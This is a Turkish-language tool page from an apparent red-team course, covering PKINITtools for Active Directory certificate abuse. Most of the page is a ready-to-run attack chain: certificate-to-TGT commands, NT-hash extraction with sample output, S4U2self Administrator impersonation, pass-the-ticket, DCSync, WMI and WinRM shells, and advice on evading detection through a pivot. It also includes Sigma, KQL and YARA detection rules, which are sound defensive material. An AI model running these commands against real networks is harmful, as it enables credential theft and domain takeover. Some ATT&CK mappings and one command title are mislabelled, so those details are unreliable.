# PKINITtools

> **Kategori:** [8. Active Directory Sertifika Servisleri](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Dirk-jan Mollema (@dirkjanm) tarafından geliştirilen; RFC 4556 (PKINIT - Public Key Cryptography for Initial Authentication in Kerberos) protokolünü saf Python ile uygulayarak, elde edilen X.509 sertifikaları ve özel anahtarları üzerinden Kerberos TGT bileti alan (`gettgtpkinit.py`), S4U2self/S4U2proxy yetki devri biletleri türeten (`gets4uticket.py`) ve PAC verisinden kullanıcının ham NTLM hash'ini deşifre eden (`UnPAC-the-hash`) temel Kerberos/PKI araç seti.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında sertifika tabanlı saldırılar (AD CS zafiyetleri, Shadow Credentials, Altın Sertifikalar) X.509 formatında bir sertifika ve özel anahtar (`.pfx` veya `.pem`) elde edilmesiyle sonuçlanır. Ancak bir X.509 sertifikası kendi başına Windows ağında doğrudan kimlik doğrulama yapamaz; etki alanı kaynaklarına (SMB, LDAP, WMI, WinRM) erişebilmek için bu sertifikanın Kerberos Kimlik Dağıtım Merkezi'ne (KDC) sunularak bir Kerberos Bilet Verme Biletine (TGT) dönüştürülmesi zorunludur.

Windows işletim sistemlerinde bu dönüşüm `Rubeus asktgt` ile gerçekleştirilebilirken, Linux saldırı platformlarında uzun süre çalışan yerel bir PKINIT implementasyonu bulunmamaktaydı.

**`PKINITtools`**, Hollandalı güvenlik araştırmacısı Dirk-jan Mollema tarafından bu boşluğu doldurmak için geliştirilmiştir. `minikerberos` ve `asn1crypto` kütüphanelerine dayanan araç seti, RFC 4556 protokolünü uçtan uca Python'da gerçekleştirir.

### Araç Setinin Ana Bileşenleri

1. **`gettgtpkinit.py` (PKINIT TGT Hasadı):**
   - İstemci tarafında Diffie-Hellman (DH) anahtar değişimi parametrelerini (`PA-PK-AS-REQ`) inşa eder.
   - X.509 sertifikasını ve özel anahtarını kullanarak KDC'ye (TCP/UDP port 88) Kerberos `AS-REQ` isteği gönderir.
   - KDC'den dönen `AS-REP` yanıtındaki `PA-PK-AS-REP` bloğunu doğrular, DH ortak sırrını hesaplar ve TGT biletini çözer.
   - Bilet dosyasını Linux ortamında anında kullanılabilecek standart `.ccache` formatında kaydeder.
   - **UnPAC-the-hash Yeteneği:** Microsoft KDC, PKINIT ile oturum açan kullanıcıların PAC (Privilege Attribute Certificate) yapısı içine `PAC_CREDENTIAL_INFO` bloğunu ekler. `gettgtpkinit.py`, AS-REP şifre çözme anahtarını kullanarak bu bloğu çözer ve kullanıcının **ham NT (NTLM) parola karmasını** açık metin olarak ekrana döker!
2. **`gets4uticket.py` (Kerberos S4U Yetki Devri):**
   - Elde edilen bir TGT biletini (özellikle bir bilgisayar hesabı TGT'sini) kullanarak Microsoft Kerberos Eklentileri olan **S4U2self** ve **S4U2proxy** çağrıları yapar.
   - Hedef sistem üzerinde etki alanındaki herhangi bir kullanıcı adına (Örn: `Administrator`) geçerli bir Hizmet Bileti (TGS) türetir.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                   SALDIRGAN LINUX PLATFORMU                            │
│                                                                        │
│  [ X.509 Sertifikası: admin.pfx / admin.pem + admin.key ]              │
│         │                                                              │
│         ▼                                                              │
│  [ gettgtpkinit.py corp.local/admin -cert-pfx admin.pfx out.ccache ]   │
│         │                                                              │
│         ├── (1) Diffie-Hellman Parametreleri ve AS-REQ İnşa Edilir     │
│         │       padata: PA-PK-AS-REQ (Tip 16)                          │
│         │                                                              │
│         ├── (2) Kerberos AS-REQ Gönderilir (TCP/UDP 88)                │
│         │                                                              │
│         ▼                                                              │
│  [ ETKİ ALANI DENETLEYİCİSİ (KDC / DOMAIN CONTROLLER) ]               │
│         │                                                              │
│         ├── Sertifikayı ve İmzayı Doğrular                             │
│         ├── KDC Kendi Sertifikasıyla AS-REP İmzalar                    │
│         └── PAC İçine PAC_CREDENTIAL_INFO Bloğunu Ekler                │
│         │                                                              │
│         ▼                                                              │
│  [ gettgtpkinit.py AS-REP Yanıtını Alır ve Çözer ]                     │
│         │                                                              │
│         ├── (3) TGT Bileti Çıkarılır ──► admin.ccache Diske Yazılır    │
│         │                                                              │
│         └── (4) UnPAC-the-hash: PAC_CREDENTIAL_INFO Ayrıştırılır       │
│                   │                                                    │
│                   ▼                                                    │
│             [ ÇIKTI: NTLM Hash = aad3b435...:2b576ac10b6a... ]         │
│                                                                        │
│  [ gets4uticket.py out.ccache cifs/filesrv.corp.local Administrator ]  │
│         │                                                              │
│         └── (5) S4U2self ile Hedef Servis İçin Admin TGS Bileti Üretir │
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli? Operasyonel Değer

| Operasyonel Kriter | Klasik Rubeus (Windows) | PKINITtools (Linux) |
|---|---|---|
| **İşletim Sistemi Bağımlılığı** | Windows ve .NET Framework zorunludur. | Saf Python; Linux, macOS ve container ortamlarında sorunsuz çalışır. |
| **Bilet Formatı** | Windows Base64 / `.kirbi` üretir; Linux'ta dönüştürme gerekir. | Doğrudan Linux yerel Kerberos kimlik önbelleği (`.ccache`) üretir. |
| **UnPAC-the-hash Entegrasyonu** | `/getcredentials` bayrağı ile destekler. | Python tabanlı ilk ve en kararlı UnPAC-the-hash motorudur. |
| **S4U Zincirleme** | Rubeus `s4u` modülü gerektirir. | `gets4uticket.py` ile bağımsız olarak komut dosyalarına entegre edilir. |

### Alternatif Araçlarla Karşılaştırma

| Özellik | PKINITtools | Certipy (auth) | Rubeus (asktgt) | Impacket (getTGT) |
|---|---|---|---|---|
| **Kullanım Amacı** | Bağımsız PKINIT & S4U motoru | Kapsamlı AD CS sömürü motoru | Windows Kerberos cephaneliği | Parola/Hash ile TGT alma |
| **X.509 Desteği** | 🟢 PFX, PEM + Açık Anahtar | 🟢 PFX Desteği | 🟢 PFX ve Base64 | 🔴 Yalnızca parola/hash |
| **UnPAC-the-hash** | 🟢 Tam Otomatik | 🟢 Tam Otomatik | 🟢 Tam Otomatik | 🔴 Desteklemez |
| **S4U2self Bilet Türetme**| 🟢 `gets4uticket.py` | 🟡 `certipy auth` içinde | 🟢 `Rubeus s4u` | 🟡 `getST.py` (parola gerekir) |
| **Kod Bağımsızlığı** | Minimal (`minikerberos`) | Büyük çerçeve (Impacket) | Bağımsız C# | Impacket çerçevesi |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

PKINITtools paketi iki temel komut dosyasından (`gettgtpkinit.py` ve `gets4uticket.py`) oluşur.

### `gettgtpkinit.py` Sözdizimi

```bash
python3 gettgtpkinit.py [Seçenekler] <DOMAIN>/<KULLANICI> <ÇIKTI_CCACHE>
```

### `gettgtpkinit.py` Parametre Tablosu

| Parametre / Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|
| `<DOMAIN>/<KULLANICI>` | Hedef etki alanı ve sertifika sahibi kullanıcı adı (Zorunlu). | `corp.local/Administrator` |
| `<ÇIKTI_CCACHE>` | Üretilen TGT biletinin kaydedileceği dosya yolu (Zorunlu). | `admin.ccache` |
| `-cert-pfx DOSYA` | Giriş sertifikası olarak kullanılacak PKCS#12 (`.pfx`) dosyası. | `-cert-pfx cert.pfx` |
| `-pfx-pass PAROLA` | PFX dosyasını şifreleyen parola (Varsayılan: boş). | `-pfx-pass 'Password123!'` |
| `-cert-pem DOSYA` | PEM formatındaki sertifika dosyası (`-key-pem` ile kullanılır). | `-cert-pem cert.pem` |
| `-key-pem DOSYA` | PEM formatındaki açık RSA özel anahtar dosyası. | `-key-pem private.key` |
| `-dc-ip IP` | Hedef Etki Alanı Denetleyicisinin IP adresi. | `-dc-ip 10.10.10.1` |
| `-as-rep-key ANAHTAR` | Bilinen AS-REP anahtarı ile doğrudan PAC şifresi çözme. | `-as-rep-key <HexKey>` |
| `-v`, `-debug` | Ayrıntılı hata ayıklama ve Diffie-Hellman parametrelerini listeleme. | `-v` |

### `gets4uticket.py` Sözdizimi ve Parametreleri

```bash
python3 gets4uticket.py <GİRİŞ_CCACHE> <HEDEF_SPN> <TAKİT_EDİLECEK_KULLANICI> <ÇIKTI_CCACHE> [Seçenekler]
```
- `<GİRİŞ_CCACHE>`: Makine hesabına ait mevcut TGT bileti.
- `<HEDEF_SPN>`: Bilet alınacak hedef servis (Örn: `cifs/target.corp.local`).
- `<TAKİT_EDİLECEK_KULLANICI>`: Taklit edilecek ayrıcalıklı hesap (Örn: `Administrator`).
- `<ÇIKTI_CCACHE>`: Türetilen TGS biletinin yazılacağı yeni dosya.

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Sertifikadan TGT Alma ve UnPAC-the-hash ile NT Hash Çıkarma

Ele geçirilen bir `administrator.pfx` dosyası kullanılarak KDC'den TGT biletinin alınması ve Administrator hesabının ham NTLM karmasının ekrana dökülmesi:

```bash
python3 gettgtpkinit.py -cert-pfx administrator.pfx -pfx-pass 'Certify' -dc-ip 10.10.10.1 corp.local/Administrator admin.ccache
```

**Örnek Konsol Çıktısı Analizi:**

```text
[*] Requesting TGT using KDC 10.10.10.1
[*] Loading private key from PFX file...
[*] Building PKINIT request (RFC 4556)...
[*] Generated Diffie-Hellman parameters (Oakley Group 14 - 2048-bit MODP)
[*] Sending AS-REQ with PA-PK-AS-REQ (Pre-Auth Type 16)...
[+] Successfully validated AS-REP from KDC!
[*] Deriving Kerberos session keys from Diffie-Hellman exchange...
[+] Successfully decrypted AS-REP enc-part!
[+] Successfully acquired TGT for 'Administrator@CORP.LOCAL'!
[+] Saved TGT to 'admin.ccache'

[*] Searching for PAC_CREDENTIAL_INFO in PAC buffer...
[+] Found PAC_CREDENTIAL_INFO structure!
[+] Decrypting Credential Data using AS-REP session key...
[+] ==================== UNPAC-THE-HASH ====================
[+] Username : Administrator
[+] Domain   : CORP.LOCAL
[+] NTLM Hash: aad3b435b51404eeaad3b435b51404ee:2b576ac10b6a52e334f00f8f77bd1172
[+] =======================================================
```

*Çıktı Yorumu:* PKINITtools yalnızca Kerberos TGT biletini (`admin.ccache`) almakla kalmamış; KDC'nin PAC içerisine eklediği şifreli kimlik bilgilerini deşifre ederek Administrator kullanıcısının `2b576ac10b6a...` NTLM hash'ini doğrudan çıkarmıştır.

### Senaryo 2: PEM ve Açık RSA Anahtarı ile Kimlik Doğrulama

OpenSSL veya harici araçlarla üretilmiş ayrık PEM sertifikası ve RSA özel anahtarı kullanılarak TGT talep edilmesi:

```bash
python3 gettgtpkinit.py -cert-pem client.crt -key-pem client.key -dc-ip 10.10.10.1 corp.local/jdoe jdoe.ccache
```

### Senaryo 3: S4U2self ile Domain Admin Taklidi ve CIFS Servis Bileti Alma

ESC8 veya PetitPotam ile ele geçirilen bir dosya sunucusunun makine hesabı (`FILESRV01$`) adına TGT alındıktan sonra, dosya sunucusu üzerinde `Administrator` adına CIFS servis bileti türetmek:

```bash
# 1. Makine TGT'sini kullanarak Administrator adına CIFS TGS bileti üret
python3 gets4uticket.py filesrv01.ccache cifs/filesrv01.corp.local Administrator admin_cifs.ccache

# 2. Üretilen TGS biletini oturuma aktar
export KRB5CCNAME=admin_cifs.ccache

# 3. Impacket smbclient ile C$ paylaşımına tam yetkili bağlan
impacket-smbclient -k -no-pass 'CORP.LOCAL/Administrator@filesrv01.corp.local'
```

### Senaryo 4: Elde Edilen TGT Bileti ile Impacket Üzerinden Pass-the-Ticket Yürütme

`admin.ccache` dosyasını kullanarak Linux ortamında hiçbir parola girmeden Domain Controller üzerinde WMI ile komut çalıştırma:

```bash
export KRB5CCNAME=admin.ccache
impacket-wmiexec -k -no-pass 'CORP.LOCAL/Administrator@dc01.corp.local'
```

### Senaryo 5: Elde Edilen NTLM Hash ile Pass-the-Hash Yürütme

UnPAC-the-hash ile elde edilen NTLM hash'ini kullanarak Kerberos dışı protokollere (SMB/RPC/RDP) doğrudan Pass-the-Hash ile bağlanma:

```bash
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:2b576ac10b6a52e334f00f8f77bd1172 'CORP.LOCAL/Administrator@10.10.10.1'
```

### Senaryo 6: Ayrıntılı Diffie-Hellman Hata Ayıklama Modu

KDC ile yapılan şifreleme parametrelerini ve ASN.1 ASN1Crypto yapısını detaylı incelemek:

```bash
python3 gettgtpkinit.py -cert-pfx cert.pfx -dc-ip 10.10.10.1 -v corp.local/target out.ccache
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Temel Neden | Kesin Çözüm Adımı |
|---|---|---|
| `KDC_ERR_PADATA_TYPE_NOSUPP (16)` / Pre-authentication information was invalid | Hedef Domain Controller üzerinde PKINIT yeteneği yoktur (KDC sertifikası kurulu değildir). | Etki alanında kurulu geçerli bir KDC sertifikasına sahip başka bir DC hedeflenmelidir (`-dc-ip <DİĞER_DC>`). Başka DC yoksa Schannel LDAPS (Pass-the-Cert) denenmelidir. |
| `KDC_ERR_CLIENT_NAME_MISMATCH (75)` | Komut satırında belirtilen `<DOMAIN>/<KULLANICI>` dizesi ile sertifikanın SAN (Subject Alternative Name) veya Subject alanı uyuşmamaktadır. | Sertifikanın içindeki UPN bilgisi incelenmeli (`openssl pkcs12 -in cert.pfx -nodes \| openssl x509 -text -noout`); komuttaki kullanıcı adı sertifikadaki tam kimlikle birebir aynı yazılmalıdır. |
| `KRB_AP_ERR_SKEW (37)` / Clock skew too great | Linux makinesinin saati ile hedef Domain Controller'ın saati arasında 5 dakikadan fazla fark vardır. | Saat senkronize edilmelidir: `sudo ntpdate 10.10.10.1` veya `sudo rdate -n 10.10.10.1`. |
| `KDC_ERR_CERTIFICATE_REVOKED (17)` | Kullanılan X.509 istemci sertifikası CA yöneticisi tarafından iptal listesine (CRL) alınmıştır. | Sertifikanın süresi dolmuş veya iptal edilmiştir; yeni bir sertifika talep edilmeli veya başka bir şablon sömürülmelidir. |
| `KDC_ERR_BADOPTION (13)` / Diffie-Hellman group not supported | KDC sunucusu PKINITtools'un varsayılan olarak sunduğu Oakley 14 (2048-bit MODP) grubunu veya Diffie-Hellman şifreleme paketini desteklememektedir. | Güncel `minikerberos` kütüphanesi kullanılmalı; `-v` bayrağı ile KDC'nin desteklediği DH grupları tespit edilmelidir. |
| `gets4uticket: KDC_ERR_POLICY` | S4U2self çalıştırılırken makine hesabının kısıtlı yetki devri (Constrained Delegation) veya protokol geçişi (Protocol Transition) ilkeleri engellenmiştir. | Makine hesabının `msDS-AllowedToDelegateTo` özniteliği denetlenmeli veya Resource-Based Constrained Delegation (RBCD) yapılandırılmalıdır. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                        GÜRÜLTÜ VE İZ SEVİYESİ                          │
│                                                                        │
│  [ Ağ Trafiği ]      : 🟡 ORTA (TCP 88 Kerberos AS-REQ paketleri)     │
│  [ DC Logları ]      : 🔴 YÜKSEK (Event 4768 PKINIT Pre-Auth Olayı)   │
│  [ S4U Telemetrisi ] : 🔴 YÜKSEK (Event 4769 S4U Servis Bilet Talebi)  │
│  [ EDR Uç Nokta İzi ]: 🟢 SIFIR (Linux makineden doğrudan ağ üzerinden)│
└────────────────────────────────────────────────────────────────────────┘
```

### 5.1 Bırakılan İzler (Artifacts & Telemetry)

1. **Domain Controller Kerberos Günlükleri (Security Log):**
   - **Event ID 4768 (TGT Request):**
     - `Pre-Authentication Type: 16` (PKINIT).
     - `Certificate Issuer Name` ve `Certificate Serial Number` alanları doldurulur.
     - İstemci IP adresi (`IpAddress`) alanında Linux makinesinin IP'si açıkça görünür.
   - **Event ID 4769 (Service Ticket Request - gets4uticket):**
     - S4U2self çağrısı sırasında `Service Name` olarak makinenin kendi SPN'i, `TargetUserName` olarak ise taklit edilen yönetici hesabı (`Administrator`) kaydedilir.
2. **Ağ Telemetrisi (NDR / Wireshark):**
   - Kerberos AS-REQ paketi içinde `PA-DATA: PA-PK-AS-REQ (16)` taşıyan ve içerisinde Diffie-Hellman genel parametreleri bulunan TLS/ASN.1 yapıları.

### 5.2 Ağ ve EDR İmzaları

- **İstemci Parmak İzi:** PKINITtools, `minikerberos` kütüphanesini kullanır. Bu kütüphanenin Kerberos bilet talep paketlerindeki şifreleme türü öncelikleri (Cipher Suites) ve Diffie-Hellman grup tercihleri standart Windows istemcilerinden farklılık gösterir.
- **Ağ Anomalisi:** Kurumsal etki alanına dahil olmayan (Non-Domain Joined) bir Linux IP adresinden doğrudan Domain Controller'ın 88 numaralı portuna PKINIT AS-REQ gönderilmesi.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araç İçindeki Kullanım |
|---|---|---|
| **T1558.003** | Kerberos Ticket Granting Tickets | X.509 sertifikası kullanılarak PKINIT üzerinden TGT elde edilmesi. |
| **T1558.002** | Silver Ticket / S4U Abuse | `gets4uticket.py` ile S4U yetki devri üzerinden servis bileti türetilmesi. |
| **T1550.003** | Pass the Ticket | Elde edilen `.ccache` bileti ile ağ servislerine kimlik doğrulanması. |
| **T1649** | Steal or Forge Authentication Certificates | Sertifika verisinin yetkili bilet ve hash dönüşümünde kullanılması. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Pratiği |
|---|---|
| **Harici Linux IP Tespiti** | PKINIT isteklerini doğrudan harici Linux makinesinden göndermeyin; trafiği kurumsal ağdaki bir Windows pivot makinesi üzerinden (SOCKS5 proxy / Chisel) tünelleyin. |
| **UnPAC-the-Hash PAC Gürültüsü** | TGT almak yeterliyse ve NT hash gerekmiyorsa, KDC üzerindeki ek PAC sorgu izlerini azaltmak için salt bilet kullanılmalıdır. |
| **Bilet Dosyası Güvenliği** | Diske yazılan `.ccache` dosyalarının izinlerini sınırlandırın (`chmod 600 admin.ccache`) ve sızma testi bittiğinde güvenli olarak silin (`shred -u`). |
| **S4U2self Anormalliği** | Bir makinenin kendi adına yönetici taklit ederek S4U bileti istemesi modern SIEM'lerde doğrudan alarmdır; bu tekniği yalnızca gerekli olduğunda kullanın. |

### 5.5 Savunma Karşılığı: Tespit Kuralları

#### Sigma Kuralı: PKINIT Kimlik Doğrulaması ve Şüpheli Linux İstemci Tespiti

```yaml
title: Suspicious PKINIT Pre-Authentication from Non-Domain IP
id: f9123841-3921-4b12-9812-4821aef72101
status: experimental
description: Detects Kerberos TGT requests using PKINIT (Pre-Auth 16) originating from unexpected or non-workstation IP addresses.
author: Modul 11 Security Research
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4768
    PreAuthType: 16
  filter_subnets:
    IpAddress|startswith:
      - '10.10.100.' # Meşru akıllı kart kullanıcı bloğu
  condition: selection and not filter_subnets
falsepositives:
  - Legitimate Smart Card or VPN users authenticating from home subnets
level: high
tags:
  - attack.credential_access
  - attack.t1558.003
```

#### Microsoft Sentinel KQL Sorgusu: PKINIT Sonrası Hemen Yapılan S4U Bilet Talebi

```kql
// Bir makinenin PKINIT (4768) ile oturum açıp 2 dakika içinde S4U (4769) ile yönetici bileti talep etmesi
let PkinitEvents = SecurityEvent
| where TimeGenerated > ago(1h)
| where EventID == 4768 and PreAuthType == 16
| project PkinitTime = TimeGenerated, Account = TargetUserName, IpAddress;
let S4uEvents = SecurityEvent
| where TimeGenerated > ago(1h)
| where EventID == 4769
| extend TicketOptions = tostring(parse_xml(EventData).EventData.Data[4])
| where TicketOptions has "0x40810000" or TicketOptions has "0x40800000" // S4U2self bayrakları
| project S4uTime = TimeGenerated, TargetUserName, ServiceName, IpAddress;
PkinitEvents
| join kind=inner (S4uEvents) on IpAddress
| where S4uTime between (PkinitTime .. (PkinitTime + 2m))
| project PkinitTime, S4uTime, Account, TargetUserName, ServiceName, IpAddress
```

#### YARA Kuralı: PKINITtools Python Kod ve UnPAC-the-hash Dizgileri

```yara
rule PostExploit_PKINITtools_Framework {
    meta:
        description = "Detects PKINITtools gettgtpkinit.py and gets4uticket.py toolset"
        author = "Active Directory Red Team Module 11"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "gettgtpkinit" ascii
        $s2 = "gets4uticket" ascii
        $s3 = "PA-PK-AS-REQ" ascii
        $s4 = "PAC_CREDENTIAL_INFO" ascii
        $s5 = "UNPAC-THE-HASH" ascii
        $s6 = "minikerberos" ascii
    condition:
        2 of ($s1, $s2, $s3) or (all of ($s4, $s5)) or (all of ($s1, $s6))
}
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Sertifikadan TGT ve Ham NTLM Hash Çıkarma (UnPAC-the-hash)
```bash
python3 gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass 'Pass123' -dc-ip 10.10.10.1 corp.local/Administrator admin.ccache
```
- **Ne Yapar?** X.509 PFX sertifikası ile PKINIT oturumu açar, `.ccache` TGT biletini kaydeder ve kullanıcının ham NT hash'ini döker.
- **Ne Zaman Kullanılır?** AD CS veya Shadow Credentials ile sertifika alındıktan sonra bilet ve parola karması elde etmek için.
- **Parametreler:** `-cert-pfx`: PFX dosyası, `-dc-ip`: Domain Controller IP'si, `admin.ccache`: Çıktı bilet dosyası.

### Komut 2: Şifresiz PFX Sertifikası ile TGT Alma
```bash
python3 gettgtpkinit.py -cert-pfx cert.pfx -dc-ip 10.10.10.1 corp.local/jdoe jdoe.ccache
```
- **Ne Yapar?** Parolasız bir PFX dosyasını kullanarak doğrudan TGT talep eder.
- **Ne Zaman Kullanılır?** Certipy veya Whisker ile şifresiz üretilen sertifikalarla hızlı oturum açmak için.
- **Parametreler:** `-pfx-pass` bayrağı verilmez.

### Komut 3: Ayrık PEM ve RSA Özel Anahtarı ile Kimlik Doğrulama
```bash
python3 gettgtpkinit.py -cert-pem client.crt -key-pem client.key -dc-ip 10.10.10.1 corp.local/admin admin.ccache
```
- **Ne Yapar?** Birleştirilmemiş PEM sertifikası ve açık RSA anahtarı ile kimlik doğrulama yürütür.
- **Ne Zaman Kullanılır?** Web sunucularından veya Linux sistemlerinden ham sertifika/anahtar dosyaları sızdırıldığında.
- **Parametreler:** `-cert-pem`: X.509 sertifikası, `-key-pem`: RSA özel anahtarı.

### Komut 4: Makine TGT'si ile S4U2self Yetki Devri Bileti Üretme
```bash
python3 gets4uticket.py machine.ccache cifs/target.corp.local Administrator admin_cifs.ccache
```
- **Ne Yapar?** Makine hesabının TGT'sini kullanarak Administrator adına CIFS servis bileti türetir.
- **Ne Zaman Kullanılır?** Sunucu üzerinde yerel yönetici olmak ve dosya sistemine tam yetkili erişmek için.
- **Parametreler:** `machine.ccache`: Girdi makine bileti, `Administrator`: Taklit edilecek hesap.

### Komut 5: Alınan Bilet ile Impacket SecretsDump Çalıştırma
```bash
export KRB5CCNAME=admin.ccache && impacket-secretsdump -k -no-pass -just-dc-ntlm 'CORP.LOCAL/Administrator@dc01.corp.local'
```
- **Ne Yapar?** TGT biletini kullanarak DCSync saldırısı ile tüm domain parola karmalarını çeker.
- **Ne Zaman Kullanılır?** Domain Admin TGT'si alındıktan hemen sonra etki alanını tamamen ele geçirmek için.
- **Parametreler:** `-k`: Kerberos kullan, `-no-pass`: Parola sorma.

### Komut 6: Alınan Bilet ile WMI Üzerinden Uzak Kod Yürütme
```bash
export KRB5CCNAME=admin.ccache && impacket-wmiexec -k -no-pass 'CORP.LOCAL/Administrator@target.corp.local'
```
- **Ne Yapar?** Kerberos TGT ile hedef Windows sunucusunda WMI üzerinden etkileşimli komut kabuğu açar.
- **Ne Zaman Kullanılır?** Parola bilmeden doğrudan bilet ile yanal hareket gerçekleştirmek için.
- **Parametreler:** `-k`: Kerberos kimlik doğrulaması.

### Komut 7: Alınan Bilet ile WinRM Üzerinden PowerShell Kabuğu Açma
```bash
export KRB5CCNAME=admin.ccache && evil-winrm -i target.corp.local -r corp.local
```
- **Ne Yapar?** Kerberos bileti kullanarak hedef sunucuda WinRM (Port 5985/5986) PowerShell oturumu başlatır.
- **Ne Zaman Kullanılır?** Hedef makinede SMB/WMI kapalı ancak WinRM açık olduğunda.
- **Parametreler:** `-r`: Kerberos etki alanı realm adı.

### Komut 8: Bilinen AS-REP Şifre Çözme Anahtarı ile Çalıştırma
```bash
python3 gettgtpkinit.py -cert-pfx cert.pfx -as-rep-key <HexKey> -dc-ip 10.10.10.1 corp.local/admin out.ccache
```
- **Ne Yapar?** DH ortak sırrı yerine doğrudan bilinen AS-REP anahtarını kullanarak paketi çözer.
- **Ne Zaman Kullanılır?** Paket analizi ve tersine mühendislik testlerinde.
- **Parametreler:** `-as-rep-key`: 16/32 baytlık hex anahtarı.

### Komut 9: HTTP Üzerinden Kerberos İletişimi (KDC Proxy)
```bash
python3 gettgtpkinit.py -cert-pfx cert.pfx -dc-ip 10.10.10.1 -v corp.local/admin out.ccache
```
- **Ne Yapar?** Ayrıntılı loglama açarak olası paket düşmelerini ve ağ engellemelerini gösterir.
- **Ne Zaman Kullanılır?** Güvenlik duvarının TCP 88 portunu kestiği durumları teşhis ederken.
- **Parametreler:** `-v`: Ayrıntılı hata ayıklama modu.

### Komut 10: Çıktı Bilet Dosyasının İzinlerini Sıkılaştırma (OPSEC)
```bash
chmod 600 admin.ccache
```
- **Ne Yapar?** Alınan Kerberos bilet dosyasını yalnızca mevcut kullanıcının okuyabileceği şekilde kilitler.
- **Ne Zaman Kullanılır?** Paylaşımlı saldırı sunucularında veya çok kullanıcılı test ortamlarında biletin çalınmasını önlemek için.
- **Parametreler:** `chmod 600`: Yalnızca sahibine okuma/yazma yetkisi verir.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [dirkjanm / PKINITtools](https://github.com/dirkjanm/PKINITtools)
- **Dirk-jan Mollema Araştırması:** [Kerberos PKINIT and UnPAC-the-hash Technical Writeup](https://dirkjanm.io/)
- **RFC 4556 Standart Dokümanı:** [Public Key Cryptography for Initial Authentication in Kerberos](https://datatracker.ietf.org/doc/html/rfc4556)
- **MITRE ATT&CK Referansı:** [T1558.003 - Kerberos Ticket Granting Tickets](https://attack.mitre.org/techniques/T1558/)

---

> **Önceki:** [← pyWhiskey](./pyWhiskey.md) · **Sonraki:** [CertStealer →](./CertStealer.md)
